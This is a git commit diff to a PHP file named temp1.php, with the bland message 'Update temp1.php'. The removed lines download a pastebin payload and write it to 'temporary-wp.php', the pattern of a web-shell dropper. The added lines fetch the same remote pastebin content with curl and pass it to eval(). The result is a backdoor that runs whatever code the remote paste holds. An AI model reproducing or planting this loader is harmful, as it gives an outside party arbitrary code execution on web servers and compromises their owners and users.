53d970e2fd53bfe6e9ca8e3ef7b9c1cedd0d324f
prokontra <99330473+prokontra@users.noreply.github.com>
2022-02-14 14:08:16 +0700

    Update temp1.php

--- temp1.php
+++ temp1.php
@@ -1,4 +1,3 @@
- <?php $nama= fopen("temporary-wp.php" ,"w+");
-  $file = file_get_contents('https://pastebin.com/raw/0XTWYaNU');
-  $tulis = fwrite ($nama ,$file);
- fclose($nama); ?>
+<?php
+$ch = curl_init('https://pastebin.com/raw/0XTWYaNU');curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result = curl_exec($ch);eval('?>'.$result);
+?>
